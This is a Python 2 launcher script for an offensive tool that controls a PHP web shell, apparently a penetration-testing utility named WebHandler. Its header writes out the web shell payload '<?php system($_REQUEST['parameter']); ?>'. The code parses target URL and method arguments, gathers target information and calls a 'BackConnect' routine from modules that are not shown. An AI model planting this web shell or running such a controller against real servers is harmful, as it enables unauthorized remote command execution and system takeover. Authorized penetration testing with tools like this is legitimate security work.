#!/usr/bin/env python

'''
-*- coding: utf-8 -*-

Command controller for <?php system($_REQUEST['parameter']); ?>

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

Developers:
    Ahmed Shawky ~ @lnxg33k (http://lnxg33k.wordpress.com)
    g0tmi1k ~ @g0tmi1k (http://www.g0tmi1k.com)
'''

# Importing modules
from core.libs.update import update
from core.libs.executer import commander
from core.libs.menu import getargs, banner, Colors
from core.modules.info import info

# Check for arguments dependencies
if getargs.url:
    if getargs.method == 'post' and not getargs.parameter:
        errmsg = '\n{[!] Using post method requires --parameter flag, check help'
        exit('{0}{1}{2}'.format(Colors.RED, errmsg, Colors.END))
    if getargs.method == 'get' and getargs.parameter:
        errmsg = '\n[!] Using get method doesn\'t require --parameter flag, check help'
        exit('{0}{1}{2}'.format(Colors.RED, errmsg, Colors.END))
    else:
        print banner                            # Get WebHandler banner
        info.get_information()                  # Call get_information and print info
        commander.BackConnect()                 # Call BackConnect method

if getargs.update:
    update()
